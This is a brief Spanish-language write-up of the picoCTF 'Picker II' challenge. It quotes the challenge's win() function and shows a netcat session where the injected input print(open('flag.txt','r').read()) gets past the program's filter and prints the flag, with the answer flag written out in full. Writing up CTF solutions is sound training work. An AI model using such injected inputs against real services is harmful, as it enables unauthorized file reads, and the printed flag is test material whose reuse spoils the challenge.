# PicoCTF Name

## Objetivo
Can you figure out how this program works to get the flag?Connect to the program with netcat:`$ nc saturn.picoctf.net 55366`The program's source code can be downloaded [here](https://artifacts.picoctf.net/c/522/picker-II.py).

## Pistas

| No. Pista | Pista |
| --------- | ----- |
|           |       |


## Solucion

```bash
def win():
  # This line will not work locally unless you create your own 'flag.txt' in
  #   the same directory as this script
  flag = open('flag.txt', 'r').read()
  #flag = flag[:-1]
  flag = flag.strip()
  str_flag = ''
  for c in flag:
    str_flag += str(hex(ord(c))) + ' '
  print(str_flag)
```
Para abrir la bandera:
```bash
┌──(kali㉿kali)-[~/Documentos/reversing]
└─$ nano picker-II.py
                                                                                                    
┌──(kali㉿kali)-[~/Documentos/reversing]
└─$ nc saturn.picoctf.net 55366                          
==> print(open('flag.txt','r').read())  
picoCTF{f1l73r5_f41l_c0d3_r3f4c70r_m1gh7_5ucc33d_0b5f1131}
'NoneType' object is not callable
```

## Notas adicionales

## Referencias